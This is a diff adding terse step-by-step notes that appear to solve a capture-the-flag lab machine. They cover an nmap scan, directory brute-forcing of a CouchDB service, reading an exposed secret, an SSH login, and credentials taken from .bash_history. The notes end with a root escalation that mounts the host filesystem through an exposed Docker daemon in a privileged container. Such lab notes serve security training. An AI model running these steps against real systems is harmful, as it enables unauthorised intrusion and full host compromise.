@@ -1,0 +1,7 @@
+1 - nmap -A 10.10.154.130
+2 - feroxbuster --url http://10.10.154.130:5984/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 403,404
+3 - http://10.10.154.130:5984/_utils/database.html?secret
+4 - ssh atena@10.10.154.130
+5 - cat .bash_history
+6 -  docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
+7 - cat /mnt/root/root.txt
